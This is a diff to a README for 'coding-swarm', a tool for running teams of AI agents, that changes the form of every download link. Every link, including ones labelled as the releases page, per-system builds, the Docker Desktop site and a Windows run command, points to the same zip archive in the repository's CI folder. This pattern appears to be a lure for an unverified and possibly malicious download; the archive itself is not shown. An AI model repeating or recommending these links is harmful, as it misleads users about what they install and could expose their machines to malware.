@@ -1,6 +1,6 @@
 # 🤖 coding-swarm - Run Teams of AI Agents Easily
 
-[![Download coding-swarm](https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip)](https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip)
+[![Download coding-swarm](https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip)](https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip)
 
 ---
 
@@ -42,18 +42,18 @@ Follow these steps to get coding-swarm up and running on your computer.
 
 To get the latest version of coding-swarm:
 
-- Visit the official [releases page on GitHub](https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip).
+- Visit the official [releases page on GitHub](https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip).
 - Look for the file that matches your operating system. For example:
-  - `https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip` for Windows.
-  - `https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip` for macOS.
-  - `https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip` for Linux.
+  - `https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip` for Windows.
+  - `https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip` for macOS.
+  - `https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip` for Linux.
 - Download the file to a location you can easily find, such as your Desktop or Downloads folder.
 
 ### 2. Install Docker (if not installed)
 
 coding-swarm uses Docker to run its AI agents safely.
 
-- Go to [https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip](https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip).
+- Go to [https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip](https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip).
 - Download Docker Desktop for your operating system.
 - Follow their installation guide to complete setup.
 - After installation, start Docker and ensure it runs in the background.
@@ -80,7 +80,7 @@ coding-swarm uses Docker to run its AI agents safely.
   or on Windows:
 
   ```
-  https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip
+  https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip
   ```
 
 - coding-swarm will start and begin running its AI agent teams in Docker containers.
@@ -132,7 +132,7 @@ If problems persist, you can report issues on the GitHub repository’s Issues p
 
 You can access the latest release and installation files by visiting the link below:
 
-[Download coding-swarm on GitHub](https://raw.githubusercontent.com/MihailBausov/coding-swarm/main/ci/swarm-coding-v2.9.zip)
+[Download coding-swarm on GitHub](https://github.com/MihailBausov/coding-swarm/raw/refs/heads/main/ci/swarm-coding-v2.9.zip)
 
 This page has all versions of coding-swarm. Choose the correct one for your system, then follow the instructions in this guide.
 
